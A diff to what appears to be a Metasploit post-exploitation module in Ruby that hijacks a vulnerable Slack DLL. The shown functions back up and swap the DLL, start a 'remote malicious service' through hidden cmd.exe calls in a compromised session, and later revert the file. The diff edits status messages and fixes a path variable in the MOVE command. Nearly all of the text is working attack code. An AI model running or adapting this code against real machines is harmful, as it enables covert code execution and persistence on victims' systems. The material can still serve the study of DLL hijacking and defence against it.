@@ -169,7 +169,7 @@ def ls_stage1
     if client.fs.file.exist?("#{d_path}\\#{p_name}")
       print_warning(" Vulnerable dll agent: #{p_name} found...")
       # backup original dll using cmd.exe COPY command...
-      print_good(" Backup original slack dll...")
+      print_good(" Backup original dll...")
       r = session.sys.process.execute("cmd.exe /c COPY /Y #{d_path}\\#{p_name} #{d_path}\\libEGL.bk", nil, {'Hidden' => true, 'Channelized' => true})
       sleep(1.0)
 
@@ -187,7 +187,7 @@ def ls_stage1
         sleep(1.0)
 
           # start remote malicious service
-          print_status("Sart remote slack service...")
+          print_status("Sart remote service...")
           r = session.sys.process.execute("cmd.exe /c sc start #{s_name}", nil, {'Hidden' => true, 'Channelized' => true})
           sleep(1.5)
 
@@ -256,7 +256,7 @@ def ls_stage2
 
       # revert original dll...
       print_good(" Revert slack dll to default stage...")
-      r = session.sys.process.execute("cmd.exe /c MOVE /Y #{d_name}\\#{b_name} #{d_path}\\${p_name}", nil, {'Hidden' => true, 'Channelized' => true})
+      r = session.sys.process.execute("cmd.exe /c MOVE /Y #{d_path}\\#{b_name} #{d_path}\\${p_name}", nil, {'Hidden' => true, 'Channelized' => true})
       sleep(1.0)
       print_status("slack dll reverted to default stage...")
       print_line("")
